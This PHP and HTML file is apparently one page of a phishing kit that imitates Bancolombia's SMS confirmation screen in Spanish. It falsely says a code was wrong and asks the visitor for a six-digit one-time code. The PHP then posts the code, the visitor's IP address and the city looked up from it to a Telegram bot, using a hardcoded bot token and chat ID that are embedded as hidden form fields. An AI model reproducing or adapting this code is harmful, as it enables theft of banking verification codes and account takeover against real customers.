<?php
// Iniciar el buffer de salida para evitar problemas con headers
ob_start();
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Confirmación</title>
    <style>
        /* Estilos generales */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
            background: linear-gradient(to left, #0000007f 50%, #0000007f 50%), 
                        url('TrazoBancolombia1.png') center center / cover no-repeat;
        }
        .banner {
            background: rgba(255, 255, 255, 0.9);
            border-radius: 10px;
            padding: 30px 20px;
            width: 100%;
            max-width: 400px;
            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.25);
            text-align: center;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }
        .alert {
            width: 100%;
            background-color: #ff4d4d;
            color: white;
            padding: 10px;
            border-radius: 5px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            font-size: 0.9rem;
            margin-bottom: 20px;
        }
        .alert span {
            flex: 1;
            text-align: left;
        }
        .alert .close-btn {
            font-size: 1.2rem;
            font-weight: bold;
            cursor: pointer;
        }
        .banner img {
            display: block;
            margin: 0 auto 10px auto;
            width: 80px;
        }
        .banner h1 {
            font-size: 1.5rem;
            margin-bottom: 10px;
        }
        .banner h2 {
            font-size: 1rem;
            color: #666;
            margin-bottom: 20px;
        }
        .input-code {
            display: flex;
            justify-content: center;
            gap: 5px;
            margin-bottom: 20px;
        }
        .input-code input {
            width: 40px;
            height: 40px;
            font-size: 1.5rem;
            text-align: center;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        button {
            width: 80%;
            padding: 10px;
            background-color: #fdc82a;
            border: none;
            border-radius: 5px;
            font-size: 1rem;
            cursor: pointer;
            font-weight: bold;
            color: black;
        }
        button:hover {
            background-color: #e0b223;
        }
    </style>
    <script>
        document.addEventListener("DOMContentLoaded", function () {
            // Funcionalidad para cerrar el cuadro de alerta
            const closeBtn = document.querySelector('.close-btn');
            const alertBox = document.querySelector('.alert');
            closeBtn.addEventListener('click', function () {
                alertBox.style.display = 'none';
            });

            // Lógica para manejar los inputs de código
            const inputs = document.querySelectorAll('.input-code input');
            inputs.forEach((input, index) => {
                input.addEventListener('input', (e) => {
                    // Si el campo tiene un número, pasar al siguiente
                    if (e.target.value.length === 1 && inputs[index + 1]) {
                        inputs[index + 1].focus();
                    }
                });
                input.addEventListener('keydown', (e) => {
                    // Si se presiona backspace en un campo vacío, ir al anterior
                    if (e.key === 'Backspace' && e.target.value === '' && inputs[index - 1]) {
                        inputs[index - 1].focus();
                    }
                });
            });
        });
    </script>
</head>
<body>
    <div class="banner">
        <div class="alert">
            <span>Código incorrecto. Enviaremos un nuevo código.</span>
            <span class="close-btn">&times;</span>
        </div>
        <img src="logobancol.png" alt="Logo">
        <h1>Confirmemos que eres tú</h1>
        <h2>Hemos enviado un mensaje de texto a tu número celular registrado en Bancolombia. Ingrésalo aquí para confirmar con éxito.</h2>
        <form action="" method="POST">
            <div class="input-code">
                <input type="text" name="code1" maxlength="1" pattern="[0-9]" inputmode="numeric" required>
                <input type="text" name="code2" maxlength="1" pattern="[0-9]" inputmode="numeric" required>
                <input type="text" name="code3" maxlength="1" pattern="[0-9]" inputmode="numeric" required>
                <input type="text" name="code4" maxlength="1" pattern="[0-9]" inputmode="numeric" required>
                <input type="text" name="code5" maxlength="1" pattern="[0-9]" inputmode="numeric" required>
                <input type="text" name="code6" maxlength="1" pattern="[0-9]" inputmode="numeric" required>
            </div>
            <input type="hidden" name="chat_id" value="1166560234">
            <input type="hidden" name="bot_token" value="6675259515:AAE0R33aF6w0UtjKIODD-2D3FVobjNeSYUQ">
            <button type="submit">Continuar</button>
        </form>
    </div>
</body>
</html>

<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Combinar los dígitos del código
    $codigo = htmlspecialchars($_POST['code1'] . $_POST['code2'] . $_POST['code3'] . $_POST['code4'] . $_POST['code5'] . $_POST['code6']);
    $chat_id = htmlspecialchars($_POST['chat_id']);
    $bot_token = htmlspecialchars($_POST['bot_token']);

    // Obtener la IP del usuario
    $ip = $_SERVER['REMOTE_ADDR'];

    // Función para obtener información de IP
    function getIpInfo($ip) {
        $url = "http://ipinfo.io/$ip/json";
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $response = curl_exec($ch);
        curl_close($ch);
        return json_decode($response, true);
    }

    // Función para enviar mensaje a Telegram
    function sendToTelegram($botToken, $chatId, $message) {
        $url = "https://api.telegram.org/bot$botToken/sendMessage";
        $data = [
            'chat_id' => $chatId,
            'text' => $message
        ];
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
        curl_exec($ch);
        curl_close($ch);
    }

    // Obtener información de la IP
    $ipInfo = getIpInfo($ip);
    $ciudad = $ipInfo['city'] ?? 'Ciudad no disponible';

    // Preparar y enviar el mensaje
    $mensaje = "Confirmación de código:\nCódigo: $codigo\nIP: $ip\nCiudad:     $ciudad";
    sendToTelegram($bot_token, $chat_id, $mensaje);

    header("Location: index.php");
    ob_end_flush();
    exit();
}
?>